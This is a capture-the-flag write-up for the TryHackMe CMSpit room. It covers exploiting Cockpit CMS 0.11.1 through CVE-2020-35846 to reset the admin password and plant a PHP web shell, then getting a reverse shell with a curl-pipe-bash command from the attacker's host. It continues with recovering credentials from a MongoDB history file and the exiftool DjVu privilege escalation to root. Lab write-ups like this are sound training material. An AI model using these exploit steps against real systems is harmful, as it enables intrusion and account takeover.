# 79 - CMSpit (CockPit CMS exploitation, MongoDB exploitation)

Room Link --> [https://tryhackme.com/room/cmspit](https://tryhackme.com/room/cmspit)

### Enumeration

{% code overflow="wrap" lineNumbers="true" %}
```
nmap -Pn -n -vvv -T4 10.10.152.31 -p-


```
{% endcode %}

The webserver is running `CockPit CMS version 0.11.1` .

Default credentials didn't work.&#x20;

Some Resources used to answer the Questions:

* [https://exploit-notes.hdks.org/exploit/web/cms/cockpit-cms-pentesting/](https://exploit-notes.hdks.org/exploit/web/cms/cockpit-cms-pentesting/)
*

### Users Enumeration

Tool link --> [https://github.com/0z09e/CVE-2020-35846](https://github.com/0z09e/CVE-2020-35846)

```bash
dking@dking ~/Downloads$ python3 exploit.py http://10.10.152.31/                                            2 â†µ  
[*] Target : http://10.10.152.31
[*] Sending request to dump users.
[+] Found Users : ['admin', 'darkStar7471', 'skidy', 'ekoparty']
[+] Changing password of admin
[*] Requesting for password reset token
[+] Found token for user admin : rp-247cb14d16593ad15dcaf8483dccc6906557d48fa0ce0
[+] Dumping admin's data
[+] Username : admin
[+] Email : admin@yourdomain.de
[+] Group : admin
[+] Hash : $2y$10$dChrF2KNbWuib/5lW1ePiegKYSxHeqWwrVC.FN5kyqhIsIdbtnOjq
[*] Resetting admin's password.
[+] Password reset succcessful
[+] New password of admin : P@ssw0rd
[*] Logging in as admin
[+] Successfully logged in as admin
[+] Bingoo, File has been deployed successfully : 1HpuLW.php
[+] File's location : http://10.10.152.31/1HpuLW.php
[*] Execution example : http://10.10.152.31/1HpuLW.php?cmd=id
[+] Output : uid=33(www-data) gid=33(www-data) groups=33(www-data)
[+] Good luck for Privilege Escalation :)

```

```
[+] Found Users : ['admin', 'darkStar7471', 'skidy', 'ekoparty']
```

Password for `admin` has been reset to `P@ssw0rd`&#x20;

We have RCE on this link --> [http://10.10.152.31/1HpuLW.php?cmd=id](http://10.10.152.31/1HpuLW.php?cmd=id)

<figure><img src=".gitbook/assets/image (2) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Initial Access

Copied bash rev shell into a `shell.sh` in my kali, then host it with python3 web server, setup NC listener then execute:&#x20;

[http://10.10.152.31/1HpuLW.php?cmd=curl%20http://10.18.88.214/shell.sh|bash](http://10.10.152.31/1HpuLW.php?cmd=curl%20http://10.18.88.214/shell.sh|bash)

And got shell.

<figure><img src=".gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Priv Esc to stux

Goto `/home/stux` dir, there is a `.dbshell` file there it contains history of MongoDB cmds.

```bash
www-data@ubuntu:/home/stux$ cat .dbshell
cat .dbshell
show
show dbs
use admin
use sudousersbak
show dbs
db.user.insert({name: "stux", name: "p4ssw0rdhack3d!123"})
show dbs
use sudousersbak
show collections
db
show
db.collectionName.find()
show collections
db.collection_name.find().pretty()
db.user.find().pretty()
db.user.insert({name: "stux"})
db.user.find().pretty()
db.flag.insert({name: "thm{c3d1af8da23926a30b0c8f4d6ab71bf851754568}"})
show collections
db.flag.find().pretty()
www-data@ubuntu:/home/stux$ 
```

`stux : p4ssw0rdhack3d!123` .

And we ssh into stux acct.

### Priv Esc to root

`sudo -l` .

```bash
stux@ubuntu:~$ sudo -l
Matching Defaults entries for stux on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User stux may run the following commands on ubuntu:
    (root) NOPASSWD: /usr/local/bin/exiftool

```

Check exiftool version: `exiftool -ver` --> 12.05

Search for the exploit in google.

[https://gist.github.com/ihebski/cfbec41067f259efdc07f1587b268ab2](https://gist.github.com/ihebski/cfbec41067f259efdc07f1587b268ab2)

```
1. Convert any PDF file to .djvu;
pdf2djvu document.pdf -o fuzz.djvu 

2. create file.dsed
(metadata
        ("\c${system '/bin/bash'}")
.

3. Generate the exploit file
djvumake fuzz.djvu INFO=0,0 BGjp=/dev/null ANTa=file.dsed

4. launch it.
sudo /usr/local/bin/exiftool fuzz.djvu
```

Got root.

